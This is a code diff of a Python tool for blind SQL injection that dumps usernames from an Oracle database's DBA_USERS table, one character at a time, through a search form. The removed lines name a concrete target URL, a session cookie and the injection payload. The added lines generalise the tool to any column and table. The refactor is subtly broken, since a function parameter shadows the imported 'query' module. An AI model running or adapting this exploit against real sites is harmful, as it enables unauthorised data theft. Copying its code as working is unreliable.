@@ -1,33 +1,20 @@
 from requests import post
+import query
 from sys import exit
 
 ### VAL AREA
-targetURL = "http://elms1.skinfosec.co.kr:8082/community6/free"
-targetString = "카카오"
-
-baseQuery = "aaaa%' and {} and 'a%'='a"
-
-userNameCount = "(SELECT COUNT(USERNAME) AS total_usernames FROM DBA_USERS) > "
-userNameIndex = "(SELECT length(USERNAME) FROM (SELECT USERNAME, rownum as rnum FROM DBA_USERS) WHERE rnum = {}) > "
-userNameData = "(SELECT ascii(substr(USERNAME, {}, 1)) FROM (SELECT USERNAME, rownum as rnum FROM DBA_USERS) WHERE rnum = {}) > "
-
-headers = {"Content-Type": "application/x-www-form-urlencoded"}
-cookies = {"JSESSIONID": "8623A875E3EA6CF5471045FFA0614F6F"}
-data = {
-    "startDt": "",
-    "endDt": "",
-    "searchType": "all",
-    "keyword": "aaaa%' and 'a%'='a",
-}
+targetURL = query.get_val("targetURL")
+headers = query.get_val("headers")
+cookies = query.get_val("cookies")
+data = query.get_val("data")
 
 
 ### FUNCTION AREA
 def check_query(query, mid):
-    completeQuery = query + str(mid)
-    data["keyword"] = baseQuery.format(completeQuery)
+    data["keyword"] = query + str(mid)
     r = post(targetURL, headers=headers, cookies=cookies, data=data)
 
-    if targetString in r.text:
+    if query.get_val("targetString") in r.text:
         return True
     else:
         return False
@@ -47,24 +34,31 @@ def binary_search(low, high, query):
     return result
 
 
-if __name__ == "__main__":
+def send_SQL(column, table):
     result = {}
-    NameCountMAX = binary_search(0, 100, userNameCount)
-    print(f"{NameCountMAX} names here")
 
-    for NameCount in range(1, NameCountMAX + 1):
+    countQuery = query.get_count(column, table)
+    nameCountMAX = binary_search(0, 100, countQuery)
+    print(f"{nameCountMAX} names here")
+
+    for num in range(1, nameCountMAX + 1):
         name = ""
-        NameIndexMAX = binary_search(1, 30, userNameIndex.format(NameCount))
-        print(f"{NameCount} user name: {NameIndexMAX} characters")
 
-        for NameIndex in range(1, NameIndexMAX + 1):
-            nameChr = chr(
-                binary_search(32, 126, userNameData.format(NameIndex, NameCount))
-            )
+        indexQuery = query.get_index(column, table).format(num)
+        nameIndexMAX = binary_search(1, 30, indexQuery)
+        print(f"{num} user name: {nameIndexMAX} characters")
+
+        for index in range(1, nameIndexMAX + 1):
+            dataQuery = query.get_data(column, table).format(index, num)
+            nameChr = chr(binary_search(32, 126, dataQuery))
             print(nameChr)
             name = name + nameChr
 
-        result[str(NameCount)] = name
-        print(f"{NameCount}:{name} Done.")
+        result[str(num)] = name
+        print(f"{num}:{name} Done.")
 
-    print(result)
+    return result
+
+
+if __name__ == "__main__":
+    send_SQL("USERNAME", "DBA_USERS")
